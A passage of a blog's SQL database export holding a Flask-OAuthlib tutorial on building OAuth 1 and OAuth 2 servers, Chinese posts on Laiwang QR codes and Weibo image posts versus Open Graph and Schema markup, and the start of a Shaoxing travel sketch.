Client.query.filter_by(client_id=client_id).first()</code></pre>\n<p>Then we would <a href="https://github.com/lepture/example-oauth2-server/commit/a10c376b6f48bfde52d5fa2d6a8c5cd50e3096e1">create Grant Token</a> and\n<a href="https://github.com/lepture/example-oauth2-server/commit/ba1fd40293e673ae35180a1c10f95820c6a93d23">Access Token</a> , and their getters and setters. It is\nmuch simpler than OAuth 1, since we don''t have to create timestamp and nonce.</p>\n<p>OAuth 2 has no Request Token. The handlers are simple too. What you need is\na token handler that handles response with access token or refresh token,\nand an authorize handler for user to confirm the request.</p>\n<pre><code class="lang-python">@app.route(''/oauth/token'')\n@oauth.token_handler\ndef access_token():\n    return None</code></pre>\n<p>Flask-OAuthlib has done all the tricks, you don''t need to handle the data\nyourself. However, you can return things that matter to you. They are\nadvanced skills, and I will not cover it here.</p>\n<p>Changes can be found at <a href="https://github.com/lepture/example-oauth2-server/commit/cbc3e12a3123f4bbc9d68eb8438247357f213583">commit#cbc3e12</a>.</p>\n<p>Now it is time for testing. We would <a href="https://github.com/lepture/example-oauth2-server/commit/060da19663e006fab409b9e87639f8e00d3c8e22">create a client.py</a> to do the job. Here is a little trick:</p>\n<pre><code class="lang-python">import os\nos.environ[''DEBUG''] = ''true''</code></pre>\n<p>Remember what I have said? OAuth 2 requires SSL all the time, since we are\ndeveloping on a local machine, we don''t have HTTPS, As a result, it is\nhard to meet this requirement. Fortunately, OAuthlib has a mechanism for\nus to debug on HTTP, that is the environ variable <code>DEBUG</code>.\n(Which is contributed by me).</p>\n<p>When we code, we make mistakes. You have to keep an eye on the error\nstack, find out what is wrong, and fix it. Yes, I did fix some bugs in\nthis commit.</p>\n<p>And now start the server and client and visit <code>http://localhost:8000/</code>.\nYou will finally get an access token.</p>\n<p>We do OAuth, because we want to protect some resources. This is the last\npart of this tutorial on OAuth 2 server. We protect them with a decorator\n<code>@oauth.require_oauth</code>, and this decorator will add an additional paramter\nto the handler.</p>\n<pre><code class="lang-python">@app.route(''/api/me'')\n@oauth.require_oauth()\ndef me():\n    return jsonify(username=request.oauth.user.username)</code></pre>\n<p>The demo is finished at <a href="https://github.com/lepture/example-oauth2-server/commit/b30339ee5df40ef75e3313587aff11d0ec67339e">commit#b30339e</a>. Check out\nthe source code and enjoy it yourself.</p>\n<h2>References &amp; Other Resources</h2>\n<p>I must confess that it is not easy to setup an OAuth server. You need to\nlearn lots of concepts for understanding. This tutorial don''t teach you\nthe realms and scopes stuff - you can learn these parts from the <a href="https://flask-oauthlib.readthedocs.org/">Flask-OAuthlib documentation</a>.</p>\n<p>We did waste lots of time on creating the models and handlers. In fact we\ndon''t have to do such boring things. A demo is just, a demo. I don''t mean\nto set limitations, and force you to use SQLAlchemy. There are chances\nthat you want to use redis instead.</p>\n<p>That''s why I put the SQLAlchemy stuff in the <code>contrib</code> module. It is not\nfinished yet, and I need your contribution.\nFind out what''s going on in <a href="https://github.com/lepture/flask-oauthlib/tree/master/flask_oauthlib/contrib">contrib</a>.</p>\n<p>And one more thing, it would be better if we put those temporary tokens\nin cache, for example request token, verifier, timestamp, nonce and\ngrant token.</p>\n<p>Remember that every link is important, if you miss one, you may miss the\ntarget. Chances are that you''ve already lost your patience.</p>\n<p><strong>TL;DR</strong></p>', '2014-11-06 23:42:49', 5, '2013-11-21 08:30:00', '2013-11-21 08:30:00', 0, '[["client", 0.35553211904535315], ["OAuth", 0.3184975233114622], ["user", 0.28146292757757124], ["token", 0.17776605952267657], ["db", 0.17776605952267657], ["oauth", 0.1481383829355638], ["return", 0.13332454464200744], ["request", 0.12591762549522925], ["username", 0.12591762549522925], ["app", 0.11851070634845105], ["Flask", 0.11851070634845105], ["will", 0.11851070634845105], ["need", 0.11851070634845105], ["commit", 0.11851070634845105], ["key", 0.11110378720167287], ["provider", 0.11110378720167287], ["server", 0.10369686805489467], ["OAuthlib", 0.10369686805489467], ["id", 0.09628994890811648], ["access", 0.08888302976133829]]', NULL, NULL, 'I''ve searched the whole internet on how to create an OAuth server or\nprovider, but failed every time. Sometimes it was the language that stopped\nme, and sometimes it was something that didn''t even work.\nAnd one day, I found Flask-OAuthProvider, which was a\ngreat piece of work. But it only implements the OAuth 1 server, and I need\nthe OAuth 2 part at that time. This was the first time I met OAuthlib.\nOAuthlib is the future of OAuth for Python.\nA quote from Kenneth Reitz, and I can''t agree more. It is really great and\nRFC-aware. However, it is undervalued with fewer than 450 stars on GitHub.\nThe code of OAuthlib is well written, so is the documentation,\nand so is the test cases. You should star it. Everything is perfect, except\nits fame. That''s why I sent a pull request to oauth.net,\nmaking it known by the world.\nOAuthlib is far more brilliant than rauth. It is a generic, spec-compliant\nlibrary, without any specific HTTP request library. It focuses on the\ndefinition of RFCs.\nFlask-OAuthlib\nIt has been 6 months since I started this project named as Flask-OAuthlib, which is a successor of Flask-OAuthProvider and Flask-OAuth.\nWith the great work of OAuthlib, I finished the client part in 4 days, and\nmade it a replacement of Flask-OAuth. It is well designed with a good\nintention for compatability of the non-standard oauth servers. If you are\nstill using Flask-OAuth, I recommend you take this project into account.\nI completed the OAuth 2 provider part at version 0.2.0, OAuth 1 provider\nat version 0.3.0. And now this project has moved to version 0.4.0. So I\nthink it is the right time to write some introduction now.\nThanks for the help of Ib Lundgren who is the maintainer of OAuthlib.\nThanks for the contribution of Randy Topliffe and Mackenzie B. Thompson.\nYou can find them on the authors list.\nTerminology & Knowledge\nThere are knowledge and terminologies that you should know. We will build\na server in Flask web framework, it is okay even if you haven''t used Flask.\nYou can still learn something that worth the time.\nSince you are going to build an OAuth server, you may need some knowledge\non these terminologies.\n\nclient: also known as application, for example Twitter for iPhone\nis a client\nresource owner: it is usually the user of a website, for example me\non Twitter: twitter.com/lepture\naccess token: this is the key for a client to get resource from a\nresource owner\n\nThere are differences between OAuth 1 and OAuth 2. A client will need some\ntemporary tokens for exchanging the final access tokens. They do have their\nown terminologies.\nOAuth 1\nOAuth 1 needs more temporary tokens, it has a request token, a verifier,\na timestamp and a nonce.\n\nrequest token: designed for exchanging the final access token\nverifier: designed for verifying the current authenticated user\ntimestamp: a timestamp of current request\nnonce: a random token that makes current request unique\n\nAll these messy things are designed for authentication and security.\nOAuth 2\nOAuth 2 is much easier, we do need only one grant token for exchanging\nthe final access token.\nOAuth 2 requires SSL over the connection for security, it simplifies the\nway for getting access token. However, SSL is also suggested on OAuth 1 in\nyour final production.\nWriting a Server\nWe need a normal server with a user system before starting the OAuth part.\nAny site which has OAuth service has a user system.\nSince this is just a demo, we will not create something that big. Let''s\nthink about it, we need a user system, we need it because we want to\nidentify the current user. But we can skip the registration part.\nThis is a basic, simple, yet functional server:\n# coding: utf-8\n\nfrom flask import Flask\nfrom flask import session, request\nfrom flask import render_template, redirect\nfrom flask_sqlalchemy import SQLAlchemy\n\n\napp = Flask(__name__, template_folder=''templates'')\napp.debug = True\napp.secret_key = ''secret''\napp.config.update({\n    ''SQLALCHEMY_DATABASE_URI'': ''sqlite:///db.sqlite'',\n})\ndb = SQLAlchemy(app)\n\n\nclass User(db.Model):\n    id = db.Column(db.Integer, primary_key=True)\n    username = db.Column(db.String(40), unique=True)\n\n\ndef current_user():\n    if ''id'' in session:\n        uid = session[''id'']\n        return User.query.get(uid)\n    return None\n\n\n@app.route(''/'', methods=(''GET'', ''POST''))\ndef home():\n    if request.method == ''POST'':\n        username = request.form.get(''username'')\n        user = User.query.filter_by(username=username).first()\n        if not user:\n            user = User(username=username)\n            db.session.add(user)\n            db.session.commit()\n        session[''id''] = user.id\n        return redirect(''/'')\n    user = current_user()\n    return render_template(''home.html'', user=user)\n\n\nif __name__ == ''__main__'':\n    db.create_all()\n    app.run()\nAnd this is the template of home.html:\n<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="UTF-8">\n  <title></title>\n</head>\n<body>\n  {% if user %}\n    <p>You are {{ user.username }}</p>\n  {% else %}\n    <p>You are not authenticated</p>\n  {% endif %}\n\n  <p>Type any username:</p>\n  <form method="post" action="/">\n    <input type="text" name="username">\n    <input type="submit">\n  </form>\n</body>\n</html>\nYou can download these files from this commit#6cfb8db. And I will continue working on this repo, browser the revisions for more details.\nCreating OAuth 1 Server\nBefore implementing the actual OAuth part, we need to define an OAuth 1\nClient. A client requires client_key, client_secret, redirect_uris,\ndefault_redirect_uri and default_realms. Find more in the Documentation.\nAll clients are bound to a developer (developer is a user). The developer\nneed to fill a form and describe the application. In this simple demo, we\nwill skip this part. It will create a client when you visit /client.\nfrom flask import jsonify\nfrom werkzeug.security import gen_salt\n\n\nclass Client(db.Model):\n    client_key = db.Column(db.String(40), primary_key=True)\n    client_secret = db.Column(db.String(55), index=True, nullable=False)\n\n    # creator of the client\n    user_id = db.Column(db.ForeignKey(''user.id''))\n    user = db.relationship(''User'')\n    _realms = db.Column(db.Text)\n    _redirect_uris = db.Column(db.Text)\n\n    @property\n    def redirect_uris(self):\n        if self._redirect_uris:\n            return self._redirect_uris.split()\n        return []\n\n    @property\n    def default_redirect_uri(self):\n        return self.redirect_uris[0]\n\n    @property\n    def default_realms(self):\n        if self._realms:\n            return self._realms.split()\n        return []\n\n\n@app.route(''/client'')\ndef client():\n    user = current_user()\n    if not user:\n        return redirect(''/'')\n    item = Client(\n        client_key=gen_salt(40),\n        client_secret=gen_salt(50),\n        user_id=user.id,\n    )\n    db.session.add(item)\n    db.session.commit()\n    return jsonify(\n        client_key=item.client_key,\n        client_secret=item.client_secret\n    )\nYou can find the whole new code at commit#2cafa62. Now, run the script\nand visit /client.\nImplement OAuth 1 Provider\nIt is time to create a provider now. However, before we initialize a\nprovider, we need to update the configuration.\napp.config.update({\n    ''OAUTH1_PROVIDER_ENFORCE_SSL'': False,\n    ''OAUTH1_PROVIDER_KEY_LENGTH'': (10, 100),\n})\nBecause we are developing on a local machine, it would be easier for us\nto implement it over HTTP. This is why we set OAUTH1_PROVIDER_ENFORCE_SSL\nto False. After this, we can create a provider:\nfrom flask_oauthlib.provider import OAuth1Provider\noauth = OAuth1Provider(app)\n\n@oauth.clientgetter\ndef load_client(client_key):\n    return Client.query.filter_by(client_key=client_key).first()\nCheck code at commit#78f6cf5.\nThere will be lots of code, and they would flush this article. In this case,\nI would keep them in a repo, and create a revision every time a milestone\nfinished. You need to follow the links to view the changes.\nThe next step is creating request token and verifier, we did this by following the documentation of Request Token and Verifier.\nLike request token and verifier, we mix timestamp and nonce together.\nFind out how we create timestamp and nonce. This\nis done with the help of documentation on Timestamp and Nonce.\nWe will finish all the data models when access token is created.\nThe next big thing is the handlers - how we handle the authorization flow,\nthe request token and access token. Check commit#55664c4.\nIn this commit, we implemented all required handlers. And we also fixed\nsome bugs, added a logger for debugging. There was a change in /client\nhandler, we added a redirect uri data to the model, and we would use it\nlater.\nNow that we have finished the authorization part of OAuth 1 server, we need\na client to verify it. We created a client with Flask-OAuthlib itself at\ncommit#f8b1d09.\nLet''s have a game. Start your provider server with:\n$ python app.py\n\n\nWe visit http://127.0.0.1:5000/ and fill a username. And then we visit\nhttp://127.0.0.1:5000/client, take the client key and client secret, and\nmodify our client.py script with the key and secret. Now, we can start\nthe client server with:\n$ python client.py\n\n\nWe visit http://localhost:8000/, everything should work correctly. We\nwill be redirected to a confirm page, if we choose yes, client will obtain\na pair of access token and secret. If anything wrong happens, don''t\nhesitate to tell me. You can also debug it yourself. We enabled the\nlogging for Flask-OAuthlib so that you can debug easily.\nThe last part of this tutorial on OAuth 1 is protecting user resources. It\nis easy with a decorator require_oauth:\n@app.route(''/api/me'')\n@oauth.require_oauth()\ndef me(req):\n    user = req.user\n    return jsonify(username=user.username)\nCHANGED SINCE VERSION 0.5.0. YOU WILL WRITE THIS SNIPPET LIKE THIS:\n@app.route(''/api/me'')\n@oauth.require_oauth()\ndef me():\n    user = request.oauth.user\n    return jsonify(username=user.username)\nThis req parameter is an oauth request object, it contains many useful\ndata. You can learn more about it at Protect Resource.\nNow, find the final client.py at commit#ac3b88d.\nThis commit added a tokengetter, and fixed some bugs I created. After the\nclient obtained an access token, visit http://localhost:8000/, and you\nwill see the information of current user.\nThere are more works we should do, but we will finish it right now.\nSince this is a simple tutorial, it will not cover any advanced skills.\nHowever, I would give some suggestions at the end of this article.\nCreating OAuth 2 Server\nI created OAuth 2 provider in Flask-OAuthlib before OAuth 1 provider. That\nmeans I designed the API for OAuth 2 provider first, and OAuth 1 provider\nshares the same API with OAuth 2 provider.\nThe setup of OAuth 2 server is the same as above. First, we created a\nbasic simple server with a user system. You can find the code at\ncommit#d1e3b6d.\nThen we created a Client model and a client handler. Here are the differences,\nClient for OAuth 2 use client_id instead of client_key, default_scopes\ninstead of default_realms, and it has a client type (which is public in\nthis case). See the code at commit#3f1c8f2.\nWe created the Client following the documentation on Client (Application).\nImplement OAuth 2 Provider\nThe next step is the implementation for OAuth 2 Provider since we have\nfinished all preparation works. It is the same as OAuth 1 provider, except\nwe don''t have to make any configuration. via commit#3b60b5d.\nfrom flask_oauthlib.provider import OAuth2Provider\noauth = OAuth2Provider(app)\n\n@oauth.clientgetter\ndef load_client(client_id):\n    return Client.query.filter_by(client_id=client_id).first()\nThen we would create Grant Token and\nAccess Token , and their getters and setters. It is\nmuch simpler than OAuth 1, since we don''t have to create timestamp and nonce.\nOAuth 2 has no Request Token. The handlers are simple too. What you need is\na token handler that handles response with access token or refresh token,\nand an authorize handler for user to confirm the request.\n@app.route(''/oauth/token'')\n@oauth.token_handler\ndef access_token():\n    return None\nFlask-OAuthlib has done all the tricks, you don''t need to handle the data\nyourself. However, you can return things that matter to you. They are\nadvanced skills, and I will not cover it here.\nChanges can be found at commit#cbc3e12.\nNow it is time for testing. We would create a client.py to do the job. Here is a little trick:\nimport os\nos.environ[''DEBUG''] = ''true''\nRemember what I have said? OAuth 2 requires SSL all the time, since we are\ndeveloping on a local machine, we don''t have HTTPS, As a result, it is\nhard to meet this requirement. Fortunately, OAuthlib has a mechanism for\nus to debug on HTTP, that is the environ variable DEBUG.\n(Which is contributed by me).\nWhen we code, we make mistakes. You have to keep an eye on the error\nstack, find out what is wrong, and fix it. Yes, I did fix some bugs in\nthis commit.\nAnd now start the server and client and visit http://localhost:8000/.\nYou will finally get an access token.\nWe do OAuth, because we want to protect some resources. This is the last\npart of this tutorial on OAuth 2 server. We protect them with a decorator\n@oauth.require_oauth, and this decorator will add an additional paramter\nto the handler.\n@app.route(''/api/me'')\n@oauth.require_oauth()\ndef me():\n    return jsonify(username=request.oauth.user.username)\nThe demo is finished at commit#b30339e. Check out\nthe source code and enjoy it yourself.\nReferences & Other Resources\nI must confess that it is not easy to setup an OAuth server. You need to\nlearn lots of concepts for understanding. This tutorial don''t teach you\nthe realms and scopes stuff - you can learn these parts from the Flask-OAuthlib documentation.\nWe did waste lots of time on creating the models and handlers. In fact we\ndon''t have to do such boring things. A demo is just, a demo. I don''t mean\nto set limitations, and force you to use SQLAlchemy. There are chances\nthat you want to use redis instead.\nThat''s why I put the SQLAlchemy stuff in the contrib module. It is not\nfinished yet, and I need your contribution.\nFind out what''s going on in contrib.\nAnd one more thing, it would be better if we put those temporary tokens\nin cache, for example request token, verifier, timestamp, nonce and\ngrant token.\nRemember that every link is important, if you miss one, you may miss the\ntarget. Chances are that you''ve already lost your patience.\nTL;DR', NULL, NULL, NULL),
(41, 'http://lepture.com/zh/2013/laiwang-and-qrcode', '不相來往', '<p>前同事在微信羣裏發來往的二維碼，我其實也很想加，但是嫌麻煩，就略過了。</p>\n<p>我實在不能理解這樣的傳播方式。我至少需要兩部手機，相互掃描二維碼，才能加來往好友，但是我不是土豪。後來聽說不需要兩部手機，把圖片保存下來，來往可以掃描本地圖片，但是我不是阿裏員工。</p>\n<p>肉食者鄙，常常做出一些想當然的決策。具體到這件事來說，二維碼是不適合在手機間傳播的。那麼什麼合適呢？我以爲還是 URI 比較好，雖然不夠新潮。比如：</p>\n<pre><code>laiwang://user/lepture</code></pre>\n<p>但是微信不會解析該協議，可是微信會解析 HTTP，那我們做一次重定向:</p>\n<pre><code>http://laiwang.com/app/user/lepture\n=&gt; laiwang://user/lepture</code></pre>\n<p>我知道這樣不夠新潮，可是你確定你追求的是新潮？</p>\n<p>這篇上接<a href="http://lepture.com/zh/2013/anti-long-weibo">《長微博及其它》</a>，喚爲：</p>\n<blockquote><p>You are doing it wrong !</p>\n</blockquote><p>肉食者鄙，而下不能達上，大公司通病也。</p>', '2014-11-06 23:42:49', 5, '2013-11-19 05:34:00', '2013-11-19 05:34:00', 0, '[["user", 0.33207687508055556], ["laiwang", 0.33207687508055556], ["lepture", 0.33207687508055556], ["\\u65b0\\u6f6e", 0.25481360647944445], ["\\u5716\\u7247", 0.22138458338703704], ["\\u5169\\u90e8", 0.22138458338703704], ["\\u4e0d\\u5920", 0.22138458338703704], ["\\u9019\\u6a23", 0.22138458338703704], ["\\u8089\\u98df\\u8005\\u9119", 0.22138458338703704], ["\\u4e8c\\u7dad\\u78bc", 0.22138458338703704], ["\\u5fae\\u4fe1", 0.22138458338703704], ["\\u50b3\\u64ad", 0.22138458338703704], ["\\u624b\\u6a5f", 0.22138458338703704], ["\\u89e3\\u6790", 0.15822391439444441], ["\\u4f46\\u662f", 0.15457885159555557], ["\\u5fae\\u4fe1\\u6703", 0.11069229169351852], ["\\u6383\\u63cf", 0.11069229169351852], ["\\u5176\\u5be6", 0.11069229169351852], ["doing", 0.11069229169351852], ["\\u90a3\\u9ebc", 0.11069229169351852]]', NULL, NULL, '前同事在微信羣裏發來往的二維碼，我其實也很想加，但是嫌麻煩，就略過了。\n我實在不能理解這樣的傳播方式。我至少需要兩部手機，相互掃描二維碼，才能加來往好友，但是我不是土豪。後來聽說不需要兩部手機，把圖片保存下來，來往可以掃描本地圖片，但是我不是阿裏員工。\n肉食者鄙，常常做出一些想當然的決策。具體到這件事來說，二維碼是不適合在手機間傳播的。那麼什麼合適呢？我以爲還是 URI 比較好，雖然不夠新潮。比如：\nlaiwang://user/lepture\n但是微信不會解析該協議，可是微信會解析 HTTP，那我們做一次重定向:\nhttp://laiwang.com/app/user/lepture\n=> laiwang://user/lepture\n我知道這樣不夠新潮，可是你確定你追求的是新潮？\n這篇上接《長微博及其它》，喚爲：\nYou are doing it wrong !\n肉食者鄙，而下不能達上，大公司通病也。', NULL, NULL, NULL),
(42, 'http://lepture.com/zh/2013/anti-long-weibo', '長微博及其它', '<p>長微博這個詞像警世的寓言，頗有一股諷刺意味，正好比我們說方方正正的圓圈，規規矩矩的放蕩。</p>\n<p>我微博用得不勤，話多在 Twitter。一方面是微博的界面入不得眼，另一方面就是文字圖片（所謂長微博者）的濫用。微博也意識到了這點，可是又不思進取，以爲提供一個官方的文字圖片生成工具就算是解決問題了。</p>\n<p>前些時候，濟南中院微博直播薄熙來案庭審，算是開創性的大事吧。而文字直播所用的方式竟然是這長微博，也就是圖片。起先，濟南中院整理出純文本稿，而後將此文本生成圖片發表於微博，最後再由網易小編整理成純文本稿，不知花費人力幾何？信息量未變，而圖片在其傳播過程中又浪費網絡資源幾何？</p>\n<p>我不知也。假使我有點情懷，也該矯情地說一句：「也請偶爾爲這個宇宙考慮考慮吧。」</p>\n<p>即使你對這個宇宙沒有興趣，樂意於揮霍網絡資源，那你至少也應該爲視覺障礙者（盲人）考慮一下吧。我們的讀屏軟件還沒有高級到去識別你發的「長微博」。假使你是一個所謂「自媒體」的話，連這點「人文關懷」都沒有，就不要自稱「媒體」了。</p>\n<h2>Twitter 的思路</h2>\n<p>批評有時顯得蒼白無力，需要一點建設性意見。我們也偶爾需要承認，外國的月亮確實要圓一點。看看 Twitter 是如何做的。</p>\n<p>Twitter 有一個特性叫作 <a href="https://dev.twitter.com/cards">Twitter Cards</a>，用來展示嵌入內容。它可以是摘要，可以是圖片，可以是視頻，還可以是 App。</p>\n<p>當你發出一條包含網址的 Tweet 時，Twitter 會去查看該網址是否包含可展示的內容。具體的要求則是該網址包含 Twitter 所要求的標記。比如：</p>\n<pre><code class="lang-html">&lt;meta name=&quot;twitter:card&quot; content=&quot;summary&quot;&gt;\n&lt;meta name=&quot;twitter:title&quot; content=&quot;長微博及其它&quot;&gt;\n&lt;meta name=&quot;twitter:description&quot; content=&quot;....&quot;&gt;</code></pre>\n<p>然後向 Twitter 提交你的網站，待 Twitter 認證後，包含你網站的 Tweet 便會展示相關摘要了。請放心，這一步相當快，Twitter 的審覈在幾分鍾內就完成了。</p>\n<figure><img alt="Twitter Cards" src="http://ww1.sinaimg.cn/large/5d261318gw1edquzpeksnj20eb0akjsf.jpg" /></figure>\n<h2>標準的價值</h2>\n<p>Twitter 的方案並非原創，是模仿的 <a href="http://ogp.me/">Open Graph</a>。這一方案的好處是顯而易見的，一種包羅萬象的大氣。所謂互聯網者，當互聯也，關起門來獨攬全活叫自閉而非互聯。而協議就是這互聯的基礎。</p>\n<p>Open Graph 是由臉書提出的，Twitter 繼承而生 Twitter Cards，而 <a href="https://developers.google.com/+/web/snippet/">Google+</a> 兼而得之。</p>\n<p>尤其值得一提的是 <a href="http://schema.org/">Schema</a> 標準，真正有一股描述世界的霸氣：</p>\n<pre><code class="lang-html">&lt;body itemscope itemtype=&quot;http://schema.org/Product&quot;&gt;\n  &lt;h1 itemprop=&quot;name&quot;&gt;Shiny Trinket&lt;/h1&gt;\n  &lt;img itemprop=&quot;image&quot; src=&quot;{image-url}&quot; /&gt;\n  &lt;p itemprop=&quot;description&quot;&gt;Shiny trinkets are shiny.&lt;/p&gt;\n&lt;/body&gt;</code></pre>\n<p>標準需要的不一定是技術，有時只是一個想法就足夠了。比如說 RSS、Atom。</p>\n<h2>對微博建議</h2>\n<p>文字圖片的弊端也不再述了，我也知道中國人的獨特需求，他們喜歡被圈養，不太願意跳出圍城。但是這並不意味着我們就需要污染環境。</p>\n<p>正如 Twitter 模仿 Open Graph，我們也可以模仿 Schema：</p>\n<pre><code class="lang-html">&lt;div itemscope itemtype=&quot;http://weibo.com/LongWeibo&quot;&gt;\n  &lt;meta name=&quot;creator&quot; content=&quot;@lepture&quot;&gt;\n  &lt;h1 itemprop=&quot;name&quot;&gt;Article Title&lt;/h1&gt;\n  &lt;img itemprop=&quot;image&quot; src=&quot;{image-url}&quot; /&gt;\n  &lt;p itemprop=&quot;description&quot;&gt;Shiny trinkets are shiny.&lt;/p&gt;\n  &lt;div itemprop=&quot;content&quot;&gt;\n    {content}\n  &lt;/div&gt;\n&lt;/div&gt;</code></pre>\n<p>當我們分享一條鏈接時，微博便去索引此篇文章，找到全文內容，儲存爲純文本，在需要的時候展示全文。</p>\n<p>這個想法是免費的，隨時歡迎微博取用。也衷心希望對這個世界溫柔一點，儘量使用更低能耗的純文本。珍愛世界，從我做起，如果你的郵箱簽名帶有圖片，請把圖片去掉。</p>\n<hr />\n<p>2014-03-02 修正：</p>\n<p>微博其實是有 Open Graph 支持的，詳情請查閱 <a href="http://open.weibo.com/wiki/Weibo_meta_tag">Weibo meta tag</a>。</p>', '2014-11-06 23:42:49', 5, '2013-11-12 14:34:00', '2013-11-12 14:34:00', 0, '[["Twitter", 0.3812454328943052], ["\\u5716\\u7247", 0.24508634971776763], ["\\u5fae\\u535a", 0.2178545330824601], ["itemprop", 0.1906227164471526], ["name", 0.16339089981184507], ["content", 0.16339089981184507], ["meta", 0.13615908317653758], ["\\u6211\\u5011", 0.13615908317653758], ["\\u9019\\u500b", 0.13615908317653758], ["\\u4e00\\u500b", 0.10892726654123006], ["div", 0.10892726654123006], ["image", 0.10892726654123006], ["Graph", 0.10892726654123006], ["h1", 0.10892726654123006], ["Open", 0.10892726654123006], ["\\u6587\\u672c", 0.10187756941195898], ["twitter", 0.08169544990592253], ["\\u5167\\u5bb9", 0.08169544990592253], ["\\u8003\\u616e", 0.08169544990592253], ["\\u6a19\\u6e96", 0.08169544990592253]]', NULL, NULL, '長微博這個詞像警世的寓言，頗有一股諷刺意味，正好比我們說方方正正的圓圈，規規矩矩的放蕩。\n我微博用得不勤，話多在 Twitter。一方面是微博的界面入不得眼，另一方面就是文字圖片（所謂長微博者）的濫用。微博也意識到了這點，可是又不思進取，以爲提供一個官方的文字圖片生成工具就算是解決問題了。\n前些時候，濟南中院微博直播薄熙來案庭審，算是開創性的大事吧。而文字直播所用的方式竟然是這長微博，也就是圖片。起先，濟南中院整理出純文本稿，而後將此文本生成圖片發表於微博，最後再由網易小編整理成純文本稿，不知花費人力幾何？信息量未變，而圖片在其傳播過程中又浪費網絡資源幾何？\n我不知也。假使我有點情懷，也該矯情地說一句：「也請偶爾爲這個宇宙考慮考慮吧。」\n即使你對這個宇宙沒有興趣，樂意於揮霍網絡資源，那你至少也應該爲視覺障礙者（盲人）考慮一下吧。我們的讀屏軟件還沒有高級到去識別你發的「長微博」。假使你是一個所謂「自媒體」的話，連這點「人文關懷」都沒有，就不要自稱「媒體」了。\nTwitter 的思路\n批評有時顯得蒼白無力，需要一點建設性意見。我們也偶爾需要承認，外國的月亮確實要圓一點。看看 Twitter 是如何做的。\nTwitter 有一個特性叫作 Twitter Cards，用來展示嵌入內容。它可以是摘要，可以是圖片，可以是視頻，還可以是 App。\n當你發出一條包含網址的 Tweet 時，Twitter 會去查看該網址是否包含可展示的內容。具體的要求則是該網址包含 Twitter 所要求的標記。比如：\n<meta name="twitter:card" content="summary">\n<meta name="twitter:title" content="長微博及其它">\n<meta name="twitter:description" content="....">\n然後向 Twitter 提交你的網站，待 Twitter 認證後，包含你網站的 Tweet 便會展示相關摘要了。請放心，這一步相當快，Twitter 的審覈在幾分鍾內就完成了。\n\n標準的價值\nTwitter 的方案並非原創，是模仿的 Open Graph。這一方案的好處是顯而易見的，一種包羅萬象的大氣。所謂互聯網者，當互聯也，關起門來獨攬全活叫自閉而非互聯。而協議就是這互聯的基礎。\nOpen Graph 是由臉書提出的，Twitter 繼承而生 Twitter Cards，而 Google+ 兼而得之。\n尤其值得一提的是 Schema 標準，真正有一股描述世界的霸氣：\n<body itemscope itemtype="http://schema.org/Product">\n  <h1 itemprop="name">Shiny Trinket</h1>\n  <img itemprop="image" src="{image-url}" />\n  <p itemprop="description">Shiny trinkets are shiny.</p>\n</body>\n標準需要的不一定是技術，有時只是一個想法就足夠了。比如說 RSS、Atom。\n對微博建議\n文字圖片的弊端也不再述了，我也知道中國人的獨特需求，他們喜歡被圈養，不太願意跳出圍城。但是這並不意味着我們就需要污染環境。\n正如 Twitter 模仿 Open Graph，我們也可以模仿 Schema：\n<div itemscope itemtype="http://weibo.com/LongWeibo">\n  <meta name="creator" content="@lepture">\n  <h1 itemprop="name">Article Title</h1>\n  <img itemprop="image" src="{image-url}" />\n  <p itemprop="description">Shiny trinkets are shiny.</p>\n  <div itemprop="content">\n    {content}\n  </div>\n</div>\n當我們分享一條鏈接時，微博便去索引此篇文章，找到全文內容，儲存爲純文本，在需要的時候展示全文。\n這個想法是免費的，隨時歡迎微博取用。也衷心希望對這個世界溫柔一點，儘量使用更低能耗的純文本。珍愛世界，從我做起，如果你的郵箱簽名帶有圖片，請把圖片去掉。\n\n2014-03-02 修正：\n微博其實是有 Open Graph 支持的，詳情請查閱 Weibo meta tag。', NULL, NULL, NULL),
(43, 'http://lepture.com/zh/2013/hello-shaoxing', '紹興淺嘗', '<p>紹興的老街像小時候的夢，又破又舊又瑰麗。青瓦的層疊的屋頂，白粉的斑駁的牆壁，小橋，流水，人家。</p>\n<p>清晨的好夢被遊人的嘮叨驚醒。我入住的這家青年旅舍叫作書生部落，位於書聖故里躲婆弄內。書聖指的是王羲之，據聞此地正是王右軍居處。街角處有一個小池子，喚作墨池，相傳乃王羲之洗筆硯處，而曾鞏作《墨池記》以勉其勤奮。墨池里的兩只鵝像老去的生命，緩慢，悠閒，時常是靜止的，讓人疑心它們是雕塑。</p>\n<p>與墨池隔道相望的是一座寺廟，名叫戒珠寺，提匾卻叫作戒珠講寺。清晨的早課聲也是驚醒人的罪魁。據聞這座寺廟就是王羲之故居。是上午時聽一位拉包車的師傅給客人講的，如果你搜索一下「戒珠寺」當有所收穫，這位師傅倒是講得有聲有色，自然也少不了添油加醋。</p>\n<blockquote><p>這邊有一個老和尚，和王羲之關係相當好。有一回王羲之和這個老和尚在家裡下棋，下到一半有客人來訪，王羲之把夜明珠放到桌上，先出去會客，讓老和尚稍等一下。這個夜明珠是王羲之非常喜歡的珠子，平時就拿在手上的。等王羲之回來的時候，老和尚已經走了，放在桌上的夜明珠也不見了，這期間沒有其他人來，王羲之就懷疑是這老和尚偷走了，從此就不理這老和尚。老和尚就覺得奇怪，跑過來問王羲之為甚麼不理他。王羲之的僕人就說：「你做了甚麼，你自己不知道？」後來老和尚就知道王羲之認為他偷了明珠，為了表示自己清白就上吊自殺了。再後來王羲之家來了客人，家裡殺鵝招待，從鵝的肚子里掉出來了珠子，正好就是王羲之丟掉的這個夜明珠。王羲之就曉得自己冤枉了老和尚，覺得很愧疚，就把自己的宅子捐了出來，作為寺廟，叫戒珠講寺。</p>\n</blockquote><p>故事大抵如此，當然油醋總是會有的。附近還有一處題扇橋，又是王羲之軼事之一。石板台階的拱橋，兩邊都傍上了綠枝，拱橋下停泊著三四艘烏蓬船。橋邊有一處亭子，等到下午時分便會有老爺子過來下棋。</p>\n<figure><img alt="烏蓬船" src="http://ww3.sinaimg.cn/large/5d261318gw1e9rtv5m4c6j21kw16o7wh.jpg" /></figure>\n<p>我出門的時候是七點半的光景，這一帶不像魯迅故里，本就少有遊客，清晨時分就更少了。可是老太太們大清早就醒來了，有圍著腳踏三輪車買紅蠟的，更多的時候是在生煤爐。</p>\n<figure><img alt="生煤爐" src="http://ww1.sinaimg.cn/large/5d261318gw1e9ru0byx3oj21kw16owuy.jpg" 